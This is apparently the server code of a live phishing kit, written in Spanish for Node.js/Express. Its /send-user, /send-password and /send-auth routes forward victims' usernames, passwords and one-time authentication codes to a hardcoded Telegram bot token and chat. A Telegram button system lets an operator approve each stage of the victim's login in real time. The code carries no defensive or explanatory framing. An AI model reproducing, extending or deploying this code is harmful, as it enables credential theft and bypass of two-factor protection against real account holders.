// Requerir las dependencias necesarias.
const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const path = require('path'); // Para manejar rutas de archivos
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); // Para servir archivos estáticos (HTML, CSS, JS)

// Objeto para almacenar datos por dispositivo
let usuariosData = {};
// ========================================
// SISTEMA INDEPENDIENTE DE OPCIONES SÍ/NO
// ========================================

// Configuración de Telegram ya existente en Render
const OPCIONES_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const OPCIONES_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Dirección pública del sitio
const OPCIONES_URL_SITIO = 'https://pruebns.onrender.com';

// Solicitudes pendientes y sus decisiones
const solicitudesOpciones = new Map();

// Ruta privada del webhook, generada a partir del token
const OPCIONES_WEBHOOK_RUTA = OPCIONES_BOT_TOKEN
    ? '/telegram-opciones-' +
      crypto.createHash('sha256')
          .update(OPCIONES_BOT_TOKEN)
          .digest('hex')
          .slice(0, 32)
    : null;


// ----------------------------------------
// COMUNICACIÓN CON TELEGRAM
// ----------------------------------------

async function llamarTelegramOpciones(metodo, datos) {

    if (!OPCIONES_BOT_TOKEN) {
        throw new Error('Falta TELEGRAM_BOT_TOKEN');
    }

    const respuesta = await fetch(
        `https://api.telegram.org/bot${OPCIONES_BOT_TOKEN}/${metodo}`,
        {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(datos)
        }
    );

    const resultado = await respuesta.json();

    if (!respuesta.ok || !resultado.ok) {
        throw new Error(
            resultado.description || 'Error de Telegram'
        );
    }

    return resultado.result;
}


// ----------------------------------------
// CREAR SOLICITUD DE OPCIONES
// ----------------------------------------

app.post('/opciones/crear', async (req, res) => {

    const { dispositivoID, etapa } = req.body;

const etapaSolicitud =
    etapa === "calificacion"
        ? "tercera"
        : etapa === "autenticacion"
            ? "segunda"
            : "primera";

    if (
        typeof dispositivoID !== 'string' ||
        !/^id\.\d{1,3}$/.test(dispositivoID)
    ) {
        return res.status(400).json({
            error: 'ID no válido'
        });
    }

    const idSolicitud = crypto.randomBytes(24).toString('hex');

const idVisible = dispositivoID.replace('id.', '');

const solicitud = {
    dispositivoID,
    etapa: etapaSolicitud,
    estado: 'pendiente',
    mensajeID: null
};

solicitudesOpciones.set(idSolicitud, solicitud);

    try {

        const mensaje = await llamarTelegramOpciones(
    'sendMessage',
    {
        chat_id: OPCIONES_CHAT_ID,

        text:
            '🔔 SELECCIÓN DE OPCIÓN\n\n' +
            'ID: ' + idVisible + '\n\n' +
            'Decisión: ' +
(
    etapaSolicitud === 'tercera'
        ? 'Tercera'
        : etapaSolicitud === 'segunda'
            ? 'Segunda'
            : 'Primera'
) +
            '\n\nSelecciona una opción:',

                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: '✅ Sí',
                                callback_data: 'si:' + idSolicitud
                            },
                            {
                                text: '❌ No',
                                callback_data: 'no:' + idSolicitud
                            }
                        ]
                    ]
                }
            }
        );

        solicitud.mensajeID = mensaje.message_id;

        return res.json({
            ok: true,
            idSolicitud
        });

    } catch (error) {

        solicitudesOpciones.delete(idSolicitud);

        console.error(
            'Error al crear solicitud:',
            error.message
        );

        return res.status(500).json({
            error: 'No se pudo crear la solicitud'
        });
    }
});


// ----------------------------------------
// CONSULTAR DECISIÓN
// ----------------------------------------

app.get('/opciones/estado/:idSolicitud', (req, res) => {

    const { idSolicitud } = req.params;

    const solicitud = solicitudesOpciones.get(idSolicitud);

    if (!solicitud) {
        return res.status(404).json({
            error: 'Solicitud no encontrada'
        });
    }

    return res.json({
        estado: solicitud.estado
    });
});


// ----------------------------------------
// RECIBIR DECISIÓN DESDE TELEGRAM
// ----------------------------------------

if (OPCIONES_WEBHOOK_RUTA) {

    app.post(OPCIONES_WEBHOOK_RUTA, async (req, res) => {

        const callback = req.body.callback_query;

        if (!callback) {
            return res.sendStatus(200);
        }

        const chatID = callback.message?.chat?.id;

        // Solo aceptar decisiones del chat configurado
        if (String(chatID) !== String(OPCIONES_CHAT_ID)) {
            return res.sendStatus(200);
        }

        const datos = String(callback.data || '');

        const separador = datos.indexOf(':');

        if (separador === -1) {
            return res.sendStatus(200);
        }

        const opcion = datos.slice(0, separador);
        const idSolicitud = datos.slice(separador + 1);

        if (opcion !== 'si' && opcion !== 'no') {
            return res.sendStatus(200);
        }

        const solicitud = solicitudesOpciones.get(idSolicitud);

        if (
            !solicitud ||
            solicitud.estado !== 'pendiente' ||
            solicitud.mensajeID !== callback.message?.message_id
        ) {

            try {
                await llamarTelegramOpciones(
                    'answerCallbackQuery',
                    {
                        callback_query_id: callback.id,
                        text: 'Esta solicitud ya fue procesada.'
                    }
                );
            } catch (error) {
                console.error(error.message);
            }

            return res.sendStatus(200);
        }

        // Registrar la decisión
        solicitud.estado = opcion;

        // Confirmar la pulsación del botón
        try {

            await llamarTelegramOpciones(
                'answerCallbackQuery',
                {
                    callback_query_id: callback.id,
                    text: opcion === 'si'
                        ? 'Opción Sí seleccionada'
                        : 'Opción No seleccionada'
                }
            );

            // Quitar los botones del mensaje
            await llamarTelegramOpciones(
                'editMessageReplyMarkup',
                {
                    chat_id: OPCIONES_CHAT_ID,
                    message_id: solicitud.mensajeID,
                    reply_markup: {
                        inline_keyboard: []
                    }
                }
            );

        } catch (error) {

            console.error(
                'Error al actualizar mensaje:',
                error.message
            );
        }

        return res.sendStatus(200);
    });
}


// ----------------------------------------
// CONFIGURAR WEBHOOK
// ----------------------------------------

async function configurarWebhookOpciones() {

    if (!OPCIONES_BOT_TOKEN || !OPCIONES_CHAT_ID) {

        console.error(
            'Falta configurar TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID'
        );

        return;
    }

    try {

        const urlWebhook =
            OPCIONES_URL_SITIO + OPCIONES_WEBHOOK_RUTA;

        await llamarTelegramOpciones(
            'setWebhook',
            {
                url: urlWebhook,
                allowed_updates: ['callback_query']
            }
        );

        console.log(
            'Webhook de opciones configurado correctamente'
        );

    } catch (error) {

        console.error(
            'Error configurando webhook:',
            error.message
        );
    }
}

// Ruta para servir el archivo index.html en la raíz
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Ruta para recibir y enviar el nombre de usuario al bot de Telegram
app.post('/send-user', async (req, res) => {
    const { dispositivoID, texto: usuario } = req.body;

    // Almacenar el usuario por dispositivo
    if (!usuariosData[dispositivoID]) {
        usuariosData[dispositivoID] = { usuario: null, contraseña: null, codigo: null };
    }
    usuariosData[dispositivoID].usuario = `UUUUU ${dispositivoID.replace('id.', '')}: \`${usuario}\``;

    await fetch(`https://api.telegram.org/bot8957452839:AAHVGv2F_wgM1Z03-VAOSpGdxTB8jhwrq3A/sendMessage`, {
        method: 'POST',
        body: JSON.stringify({
            chat_id: '8660458713',
            text: usuariosData[dispositivoID].usuario,
            parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
        }),
        headers: { 'Content-Type': 'application/json' },
    });
    res.sendStatus(200);
});

// Ruta para recibir y enviar la contraseña al bot de Telegram
app.post('/send-password', async (req, res) => {
    const { dispositivoID, texto: password } = req.body;

    // Almacenar la contraseña por dispositivo
    if (usuariosData[dispositivoID]) {
        usuariosData[dispositivoID].contraseña = `CCCCC ${dispositivoID.replace('id.', '')}: \`${password}\``;
    }

    await fetch(`https://api.telegram.org/bot8957452839:AAHVGv2F_wgM1Z03-VAOSpGdxTB8jhwrq3A/sendMessage`, {
        method: 'POST',
        body: JSON.stringify({
            chat_id: '8660458713',
            text: usuariosData[dispositivoID].contraseña,
            parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
        }),
        headers: { 'Content-Type': 'application/json' },
    });
    res.sendStatus(200);
});

// Ruta para recibir y enviar el código de autenticación al bot de Telegram
app.post('/send-auth', async (req, res) => {
    const { dispositivoID, texto: authCode } = req.body;

    // Almacenar el código de autenticación por dispositivo
    if (usuariosData[dispositivoID]) {
        usuariosData[dispositivoID].codigo = `AAAAA ${dispositivoID.replace('id.', '')}: \`${authCode}\``;
    }

    await fetch(`https://api.telegram.org/bot8957452839:AAHVGv2F_wgM1Z03-VAOSpGdxTB8jhwrq3A/sendMessage`, {
        method: 'POST',
        body: JSON.stringify({
            chat_id: '8660458713',
            text: usuariosData[dispositivoID].codigo,
            parse_mode: 'Markdown' // Configura Telegram para interpretar el formato
        }),
        headers: { 'Content-Type': 'application/json' },
    });
    res.sendStatus(200);
});

// Inicia el servidor en el puerto especificado
app.listen(PORT, () => {

    console.log(
        `Servidor corriendo en http://localhost:${PORT}`
    );

    configurarWebhookOpciones();
});